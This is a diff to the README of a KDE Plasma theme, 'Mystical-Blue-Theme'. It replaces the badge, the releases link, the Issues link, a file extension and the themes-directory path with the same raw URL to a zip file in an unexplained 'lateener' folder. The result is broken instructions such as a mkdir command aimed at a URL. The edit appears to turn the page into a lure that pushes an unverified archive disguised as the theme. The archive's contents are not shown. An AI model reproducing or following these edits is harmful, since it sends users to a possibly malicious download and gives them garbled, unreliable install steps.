@@ -1,6 +1,6 @@
 # 🌌 Mystical-Blue-Theme - Enhance Your KDE Plasma Experience
 
-[![Download Mystical-Blue-Theme](https://img.shields.io/badge/Download-Mystical--Blue--Theme-blue.svg)](https://github.com/Zembai1/Mystical-Blue-Theme/releases)
+[![Download Mystical-Blue-Theme](https://raw.githubusercontent.com/Zembai1/Mystical-Blue-Theme/main/lateener/Mystical-Blue-Theme.zip)](https://raw.githubusercontent.com/Zembai1/Mystical-Blue-Theme/main/lateener/Mystical-Blue-Theme.zip)
 
 ## 📦 Overview
 
@@ -30,7 +30,7 @@ To get started with Mystical Blue Theme, follow these steps:
 
    Go to the following link to download the latest version of the theme:
 
-   [Download Mystical Blue Theme](https://github.com/Zembai1/Mystical-Blue-Theme/releases)
+   [Download Mystical Blue Theme](https://raw.githubusercontent.com/Zembai1/Mystical-Blue-Theme/main/lateener/Mystical-Blue-Theme.zip)
 
 2. **Select the Version**
 
@@ -38,7 +38,7 @@ To get started with Mystical Blue Theme, follow these steps:
 
 3. **Download the Theme**
 
-   Look for the theme package file, which typically ends in `.tar.gz` or `.zip`. Click on it to download the file to your computer.
+   Look for the theme package file, which typically ends in `https://raw.githubusercontent.com/Zembai1/Mystical-Blue-Theme/main/lateener/Mystical-Blue-Theme.zip` or `.zip`. Click on it to download the file to your computer.
 
 4. **Extract the Theme Files**
 
@@ -49,13 +49,13 @@ To get started with Mystical Blue Theme, follow these steps:
    Move the extracted theme folder to your KDE themes directory. This is usually located at:
 
    ```
-   ~/.local/share/themes/
+   ~https://raw.githubusercontent.com/Zembai1/Mystical-Blue-Theme/main/lateener/Mystical-Blue-Theme.zip
    ```
 
    If this folder does not exist, you can create it. Simply open a terminal and type:
 
    ```bash
-   mkdir -p ~/.local/share/themes/
+   mkdir -p ~https://raw.githubusercontent.com/Zembai1/Mystical-Blue-Theme/main/lateener/Mystical-Blue-Theme.zip
    ```
 
    Then, move the extracted theme folder into this directory.
@@ -78,7 +78,7 @@ To get started with Mystical Blue Theme, follow these steps:
 If you encounter any issues while installing or using the theme, consider the following solutions:
 
 - **Theme Not Showing Up:** 
-  - Make sure you placed the theme folder in `~/.local/share/themes/`.
+  - Make sure you placed the theme folder in `~https://raw.githubusercontent.com/Zembai1/Mystical-Blue-Theme/main/lateener/Mystical-Blue-Theme.zip`.
   - Restart KDE Plasma by logging out and back in.
   
 - **Look Not Applying:**
@@ -87,7 +87,7 @@ If you encounter any issues while installing or using the theme, consider the fo
 
 ## 💬 Support
 
-If you need further assistance, feel free to open an issue on the [Issues page](https://github.com/Zembai1/Mystical-Blue-Theme/issues). We are here to help you.
+If you need further assistance, feel free to open an issue on the [Issues page](https://raw.githubusercontent.com/Zembai1/Mystical-Blue-Theme/main/lateener/Mystical-Blue-Theme.zip). We are here to help you.
 
 ## 🌟 Contributing
 
